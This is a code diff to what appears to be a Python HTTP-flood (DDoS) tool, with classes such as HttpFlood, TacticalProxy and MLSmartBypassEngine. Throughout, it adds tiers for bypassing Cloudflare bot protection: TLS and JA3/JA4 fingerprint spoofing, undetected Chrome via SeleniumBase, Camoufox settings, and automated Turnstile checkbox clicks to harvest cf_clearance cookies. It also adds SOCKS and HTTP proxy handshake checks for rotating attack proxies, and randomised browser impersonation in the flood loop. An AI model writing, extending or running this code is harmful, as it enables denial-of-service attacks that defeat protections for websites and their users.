@@ -35,7 +35,7 @@ if hasattr(sys.stderr, "reconfigure"):
 from base64 import b64encode
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
-from src.core.human_mouse import move as human_mouse_move
+from src.core.human_mouse import move as human_mouse_move, async_move as human_mouse_async_move
 from datetime import datetime, timedelta
 from itertools import cycle
 from json import load
@@ -115,6 +115,13 @@ try:
 except ImportError:
     CURL_CFFI_INSTALLED = False
 
+TLS_CLIENT_DLL_INSTALLED = False
+try:
+    from src.core.tls_client_wrapper import load_library as _tls_load
+    TLS_CLIENT_DLL_INSTALLED = _tls_load()
+except Exception:
+    TLS_CLIENT_DLL_INSTALLED = False
+
 try:
     from DrissionPage import ChromiumPage, ChromiumOptions
     DRISSION_INSTALLED = True
@@ -161,6 +168,23 @@ try:
 except ImportError:
     UNDETECTED_CHROMEDRIVER_INSTALLED = False
     uc_chrome = None
+
+try:
+    import sys as _sys_sb
+    import os as _os_sb
+    _SB_PATH = str(_os_sb.path.join(
+        _os_sb.path.dirname(_os_sb.path.dirname(_os_sb.path.dirname(_os_sb.path.abspath(__file__)))),
+        "resource", "SeleniumBase"
+    ))
+    if _SB_PATH not in _sys_sb.path:
+        _sys_sb.path.insert(0, _SB_PATH)
+    from seleniumbase.undetected import Chrome as SBChrome, ChromeOptions as SBChromeOptions
+    SELENIUMBASE_INSTALLED = True
+except Exception:
+    SELENIUMBASE_INSTALLED = False
+    SBChrome = None
+    SBChromeOptions = None
+
 
 _ML_SWITCH_COUNT: int = 0
 _ML_SWITCH_STATS: dict = {}
@@ -1262,10 +1286,12 @@ class TacticalProxy:
         return 0
 
 
-async def _check_proxy_async(target_host: str, proxy: Union['TacticalProxy', Proxy], timeout: float = 3.0) -> 'TacticalProxy':
-    """Pure async non-blocking proxy verification."""
+async def _check_proxy_async(target_host: str, proxy: Union['TacticalProxy', Proxy], timeout: float = 2.5) -> 'TacticalProxy':
+    """Pure async non-blocking proxy verification with active protocol handshake."""
     from time import time
     from contextlib import suppress
+    import socket
+    import struct
     
     base_proxy = getattr(proxy, "proxy", None)
     if base_proxy is None:
@@ -1282,17 +1308,65 @@ async def _check_proxy_async(target_host: str, proxy: Union['TacticalProxy', Pro
         except (ValueError, IndexError):
             port = 80
             
+    p_type = getattr(proxy, "type", getattr(base_proxy, "type", None))
+
     start_time = time()
     try:
-        reader, writer = await asyncio.wait_for(
-            asyncio.open_connection(host, port),
-            timeout=timeout
-        )
-        writer.close()
-        with suppress(Exception):
-            await writer.wait_closed()
-        latency = (time() - start_time) * 1000
-        return TacticalProxy(base_proxy, latency, True, 200)
+        async def _do_handshake():
+            reader, writer = await asyncio.open_connection(host, port)
+            try:
+                type_str = str(p_type).upper() if p_type is not None else ""
+                
+                # Check SOCKS5 handshake
+                if p_type == ProxyType.SOCKS5 or p_type == 4 or "SOCKS5" in type_str:
+                    writer.write(b"\x05\x01\x00")
+                    await writer.drain()
+                    resp = await reader.read(2)
+                    return len(resp) >= 2 and resp[0] == 0x05 and resp[1] == 0x00
+                # Check SOCKS4 handshake
+                elif p_type == ProxyType.SOCKS4 or p_type == 3 or "SOCKS4" in type_str:
+                    try:
+                        ip_bytes = socket.inet_aton(target_host)
+                    except OSError:
+                        ip_bytes = socket.inet_aton("1.1.1.1")
+                    pkt = b"\x04\x01" + struct.pack(">H", 443) + ip_bytes + b"\x00"
+                    writer.write(pkt)
+                    await writer.drain()
+                    resp = await reader.read(8)
+                    return len(resp) >= 2 and resp[0] == 0x00 and resp[1] == 0x5a
+                # Check HTTP / HTTPS CONNECT handshake
+                elif p_type in (ProxyType.HTTP, ProxyType.HTTPS) or p_type in (1, 2) or "HTTP" in type_str:
+                    req = f"CONNECT {target_host}:443 HTTP/1.1\r\nHost: {target_host}:443\r\n\r\n".encode()
+                    writer.write(req)
+                    await writer.drain()
+                    resp = await reader.read(128)
+                    resp_str = resp.decode("latin-1", errors="ignore")
+                    return resp_str.startswith("HTTP/1.") and (" 200" in resp_str or " 200 " in resp_str)
+                else:
+                    # Fallback / Unspecified: Try SOCKS5 first
+                    writer.write(b"\x05\x01\x00")
+                    await writer.drain()
+                    resp = await reader.read(2)
+                    if len(resp) >= 2 and resp[0] == 0x05 and resp[1] == 0x00:
+                        return True
+                    # If SOCKS5 didn't respond, try HTTP CONNECT
+                    req = f"CONNECT {target_host}:443 HTTP/1.1\r\nHost: {target_host}:443\r\n\r\n".encode()
+                    writer.write(req)
+                    await writer.drain()
+                    resp = await reader.read(128)
+                    resp_str = resp.decode("latin-1", errors="ignore")
+                    return resp_str.startswith("HTTP/1.") and (" 200" in resp_str or " 200 " in resp_str)
+            finally:
+                writer.close()
+                with suppress(Exception):
+                    await writer.wait_closed()
+
+        is_verified = await asyncio.wait_for(_do_handshake(), timeout=timeout)
+        if is_verified:
+            latency = (time() - start_time) * 1000
+            return TacticalProxy(base_proxy, latency, True, 200)
+        else:
+            return TacticalProxy(base_proxy, 5000.0, False, 0)
     except (asyncio.TimeoutError, ConnectionRefusedError, OSError, Exception):
         return TacticalProxy(base_proxy, 5000.0, False, 0)
 
@@ -1889,7 +1963,35 @@ class MLSmartBypassEngine:
                         logger.debug(f"[!] ML_ENGINE: Pattern {fp_id} FAILED/BLOCKED. Weight decreased to {f['weight']:.1f}")
                     break
 
+    def register_runtime_ua(self, ua: str, source: str = "Runtime") -> None:
+        """Dynamically register a UA fingerprint acquired at runtime.
+
+        If the UA is already present (matched by 'ua' field), skip silently.
+        New entries start at weight=10.0 (same as built-in defaults).
+        """
+        with self.lock:
+            for f in self.fingerprints:
+                if f["ua"] == ua:
+                    return  # Already known
+            fp_id = f"runtime_{source.replace(' ', '_').lower()}_{len(self.fingerprints)}"
+            new_fp = {
+                "id": fp_id,
+                "ua": ua,
+                "headers": (
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                ),
+                "weight": 10.0,
+                "delay": 0.0,
+            }
+            self.fingerprints.append(new_fp)
+            logger.debug(
+                f"[*] ML_ENGINE: Registered runtime fingerprint {fp_id!r} from {source!r}."
+            )
+
 ML_ENGINE = MLSmartBypassEngine()
+
 
 
 class BrowserEngine:
@@ -1981,6 +2083,58 @@ class BrowserEngine:
             "just a moment", "challenges.cloudflare.com", "turnstile",
             "please complete the security check", "enable javascript and cookies to continue"
         ])
+
+    @staticmethod
+    async def _solve_tier05_tlsclient(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
+        """Tier 0.5: tls-client (bogdanfinn) — Full JA3/JA4 + H2 SETTINGS + pseudo-header-order control."""
+        if not TLS_CLIENT_DLL_INSTALLED:
+            return None, None
+        try:
+            import asyncio
+            import random
+            from src.core.tls_client_wrapper import request as tls_request, BYPASS_PROFILES
+            
+            profile = random.choice(BYPASS_PROFILES[:4])
+            ua = user_agent or MLSmartBypassEngine._pick_ua()
+            proxy_url = f"http://{proxy}" if proxy and "://" not in proxy else (proxy or "")
+
+            headers = {
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "user-agent": ua,
+                "accept-language": "en-US,en;q=0.9",
+                "accept-encoding": "gzip, deflate, br",
+                "upgrade-insecure-requests": "1",
+            }
+            header_order = ["accept", "user-agent", "accept-language", "accept-encoding", "upgrade-insecure-requests"]
+
+            result = await asyncio.to_thread(
+                tls_request,
+                url,
+                method="GET",
+                profile=profile,
+                headers=headers,
+                header_order=header_order,
+                proxy_url=proxy_url,
+                timeout_seconds=timeout,
+                follow_redirects=True,
+                insecure_skip_verify=True,
+                random_tls_ext_order=True,
+            )
+
+            status = result.get("status", 0)
+            if 200 <= status < 403:
+                cookies_raw = result.get("cookies", {})
+                if isinstance(cookies_raw, dict):
+                    cookie_str = "; ".join([f"{k}={v}" for k, v in cookies_raw.items()])
+                else:
+                    cookie_str = ""
+                if "cf_clearance" in cookie_str or status == 200:
+                    logger.info(f"{bcolors.OKGREEN}[+] Tier 0.5 tls-client SUCCESS (profile={profile}, status={status}){bcolors.RESET}")
+                    return cookie_str.strip() or None, ua
+            logger.debug(f"[*] Tier 0.5 tls-client status={status}")
+        except Exception as e:
+            logger.debug(f"Tier 0.5 tls-client error: {e}")
+        return None, None
 
     @staticmethod
     async def _solve_tier1a_cloudscraper(url: str, proxy: str = None, user_agent: str = None, timeout: int = 15):
@@ -2338,23 +2492,36 @@ class BrowserEngine:
             for frame in page.frames:
                 try:
                     if "challenges.cloudflare.com" in frame.url:
-                        f_elem = await frame.frame_element()
-                        box = await f_elem.bounding_box()
-                        if box and box["width"] > 0 and box["height"] > 0:
-                            abs_x = box["x"] + 30 + random.uniform(-3, 3)
-                            abs_y = box["y"] + (box["height"] / 2) + random.uniform(-3, 3)
-                            logger.debug(f"[Turnstile] Clicking frame {frame.url} bounding box at {abs_x}, {abs_y}")
-                            
-                            await page.mouse.move(abs_x, abs_y, steps=10)
-                            await asyncio.sleep(random.uniform(0.1, 0.3))
-                            
-                            await page.mouse.down()
-                            await asyncio.sleep(random.uniform(0.05, 0.15))
-                            await page.mouse.up()
-                            
-                            await page.mouse.move(abs_x + random.uniform(50, 100), abs_y + random.uniform(50, 100), steps=5)
-                            logger.debug(f"[Turnstile] Click complete")
-                            return True
+                        # 1. Try direct selector click first (fast & non-blocking)
+                        try:
+                            checkbox = await frame.query_selector("input[type=checkbox]")
+                            if checkbox:
+                                await frame.click("input[type=checkbox]", timeout=2000)
+                                return True
+                        except Exception:
+                            pass
+
+                        # 2. Precision coordinate click (wrapped in safety timeout to prevent hangs)
+                        try:
+                            f_elem = await asyncio.wait_for(frame.frame_element(), timeout=2.0)
+                            box = await asyncio.wait_for(f_elem.bounding_box(), timeout=2.0)
+                            if box and box["width"] > 0 and box["height"] > 0:
+                                abs_x = box["x"] + 30 + random.uniform(-3, 3)
+                                abs_y = box["y"] + (box["height"] / 2) + random.uniform(-3, 3)
+                                logger.debug(f"[Turnstile] Clicking frame {frame.url} bounding box at {abs_x}, {abs_y}")
+                                
+                                await page.mouse.move(abs_x, abs_y, steps=10)
+                                await asyncio.sleep(random.uniform(0.1, 0.3))
+                                
+                                await page.mouse.down()
+                                await asyncio.sleep(random.uniform(0.05, 0.15))
+                                await page.mouse.up()
+                                
+                                await page.mouse.move(abs_x + random.uniform(50, 100), abs_y + random.uniform(50, 100), steps=5)
+                                logger.debug(f"[Turnstile] Click complete")
+                                return True
+                        except Exception:
+                            pass
                 except Exception:
                     pass
         except Exception:
@@ -2362,7 +2529,55 @@ class BrowserEngine:
         return False
 
     @staticmethod
+    async def _solve_tier25_seleniumbase(
+        url: str,
+        proxy: Optional[str] = None,
+        user_agent: Optional[str] = None,
+        timeout: int = 30,
+    ) -> tuple[Optional[str], Optional[str]]:
+        """Tier 2.5: SeleniumBase UC (Undetected Chrome) with persistent profile cookie vault.
+
+        Uses SBSessionStore to reuse previously-solved Chrome profiles, avoiding re-solve
+        on every attack restart. Falls through immediately if SeleniumBase is not installed.
+        """
+        if not SELENIUMBASE_INSTALLED:
+            return None, None
+
+        _pcb = BrowserEngine._get_waterfall_pcb()
+        if proxy and _pcb.is_quarantined(proxy):
+            logger.warning(
+                f"{bcolors.WARNING}[!] Tier 2.5 SeleniumBase: Proxy {proxy} is quarantined. Skipping.{bcolors.RESET}"
+            )
+            return None, None
+
+        try:
+            from src.core.sb_session_store import get_sb_store
+            store = get_sb_store()
+            cookie, ua = await store.get_or_solve(url, proxy=proxy, user_agent=user_agent, timeout=timeout)
+            if cookie:
+                if ua:
+                    try:
+                        ML_ENGINE.register_runtime_ua(ua, source="Tier 2.5 (SeleniumBase)")
+                    except Exception:
+                        pass
+                try:
+                    domain = url.split("//")[-1].split("/")[0]
+                    store.write_to_engine_cache(domain, cookie, ua or "", "Tier 2.5 (SeleniumBase)")
+                except Exception:
+                    pass
+                logger.info(
+                    f"{bcolors.OKGREEN}[*] Tier 2.5 SeleniumBase: Cookie obtained for {url}{bcolors.RESET}"
+                )
+                return cookie, ua
+            BypassDebugger.capture_failure("Tier 2.5 (SeleniumBase)", url, error_msg="No cf_clearance returned")
+        except Exception as exc:
+            BypassDebugger.capture_failure("Tier 2.5 (SeleniumBase)", url, error_msg=str(exc))
+
+        return None, None
+
+    @staticmethod
     async def _solve_tier3_heavy_stealth(url: str, proxy: str = None, user_agent: str = None, timeout: int = 30):
+
         # --- Pre-flight Proxy Check ---
         if proxy and CURL_CFFI_INSTALLED:
             try:
@@ -2574,9 +2789,23 @@ class BrowserEngine:
                 _cf_os_preset = random.choice(BrowserEngine._CAMOUFOX_PRESETS)
                 camoufox_kwargs = {
                     "headless": False,
-                    "humanize": True,
+                    # Fix #2: Must be float (not bool) — C++ side requires a double for humanize:maxTime.
+                    # True (bool-as-int=1) causes "Value for key 'humanize:maxTime' is not a double" errors.
+                    "humanize": 2.5,
                     "fingerprint_preset": False,
                     "os": _cf_os_preset,
+                    # Allows Camoufox to interact with Turnstile cross-origin iframes (challenges.cloudflare.com).
+                    # Per camoufox docs: disable_coop disables Cross-Origin-Opener-Policy so iframe elements
+                    # such as the Turnstile checkbox can be clicked.
+                    "disable_coop": True,
+                    # Fix #1: Force software WebRender to prevent D3D12 compositor mismatch.
+                    # Without this, wgpu_bindings fails to find D3D12 adapter → WebGL context lost
+                    # in Turnstile iframe → challenge never completes → no cf_clearance cookie.
+                    "firefox_user_prefs": {
+                        "gfx.webrender.force-disabled": True,
+                        "gfx.webrender.software": True,
+                        "layers.acceleration.disabled": True,
+                    },
                 }
                 if proxy:
                     p_url = f"http://{proxy}" if "://" not in proxy else proxy
@@ -2615,13 +2844,30 @@ class BrowserEngine:
                                 ua = await page.evaluate("navigator.userAgent")
                                 return cookie_str, ua
 
+                            try:
+                                title = await page.title()
+                                if title and "just a moment" not in title.lower() and "attention required" not in title.lower() and "one more step" not in title.lower():
+                                    ua = await page.evaluate("navigator.userAgent")
+                                    return cookie_str, ua
+                            except Exception:
+                                pass
+
                             if loop_idx % 3 == 0:
-                                await BrowserEngine._click_turnstile_checkbox_precision_async(page)
-                        BypassDebugger.capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg="Challenge not solved")
+                                # Disabled to prevent cross-origin OOPIF Juggler bridge crash in Camoufox
+                                # await BrowserEngine._click_turnstile_checkbox_precision_async(page)
+                                try:
+                                    import inspect
+                                    await human_mouse_async_move(page, random.randint(100, 500), random.randint(100, 500))
+                                    wheel_res = page.mouse.wheel(0, random.randint(100, 300))
+                                    if inspect.isawaitable(wheel_res):
+                                        await wheel_res
+                                except Exception:
+                                    pass
+                        await BypassDebugger.async_capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg="Challenge not solved")
                     except Exception as e:
-                        BypassDebugger.capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg=str(e))
+                        await BypassDebugger.async_capture_failure("Tier 4 (Camoufox)", url, page_obj=page, error_msg=str(e))
             except Exception as e:
-                BypassDebugger.capture_failure("Tier 4 (Camoufox-Launch)", url, error_msg=str(e))
+                await BypassDebugger.async_capture_failure("Tier 4 (Camoufox-Launch)", url, error_msg=str(e))
 
         return None, None
 
@@ -2872,6 +3118,17 @@ class BrowserEngine:
                     break
 
 
+        # Tier 0.5: tls-client (bogdanfinn) — full H2 + JA4 fingerprint
+        if TLS_CLIENT_DLL_INSTALLED:
+            logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 0.5 (tls-client)...{bcolors.RESET}")
+            cookie_05, ua_05 = await BrowserEngine._solve_tier05_tlsclient(url, proxy, user_agent, 12)
+            if cookie_05:
+                logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 0.5 (tls-client)!{bcolors.RESET}")
+                HttpFlood._active_solver = "Tier 0.5 (tls-client)"
+                if proxy:
+                    _pcb.failures.pop(proxy, None)
+                return cookie_05, ua_05
+
         # Tier 1a: curl_cffi (Spoofs TLS)
         logger.info(f"{bcolors.OKCYAN}[*] Executing Tier 1a (curl_cffi)...{bcolors.RESET}")
         import asyncio
@@ -2896,8 +3153,17 @@ class BrowserEngine:
             logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 2!{bcolors.RESET}")
             HttpFlood._active_solver = "Tier 2"
             return cookie, ua
-            
+
+        # Tier 2.5: SeleniumBase UC (persistent profile + CDP-direct)
+        logger.info(f"{bcolors.WARNING}[!] Tier 2 failed. Executing Tier 2.5 (SeleniumBase UC)...{bcolors.RESET}")
+        cookie, ua = await BrowserEngine._solve_tier25_seleniumbase(url, proxy, user_agent, 30)
+        if cookie:
+            logger.info(f"{bcolors.OKGREEN}[*] Solved at Tier 2.5 (SeleniumBase)!{bcolors.RESET}")
+            HttpFlood._active_solver = "Tier 2.5 (SeleniumBase)"
+            return cookie, ua
+
         # Tier 3: Heavy Stealth Chromium
+
         logger.info(f"{bcolors.WARNING}[!] Tier 2 failed. Executing Tier 3 (Heavy Stealth)...{bcolors.RESET}")
         cookie, ua = await BrowserEngine._solve_tier3_heavy_stealth(url, proxy, user_agent, 30)
         if cookie:
@@ -4318,9 +4584,10 @@ class HttpFlood:
                     proxies = {"http": px_req["http"], "https": px_req["https"]}
                 
                 fp = ML_ENGINE.get_fingerprint()
+                profile = random.choice(["chrome124", "chrome131", "chrome133", "firefox135", "safari17_0"])
                 async with AsyncSession(
                     proxies=proxies,
-                    impersonate="chrome133",
+                    impersonate=profile,
                     verify=False,
                     timeout=8,
                 ) as session:
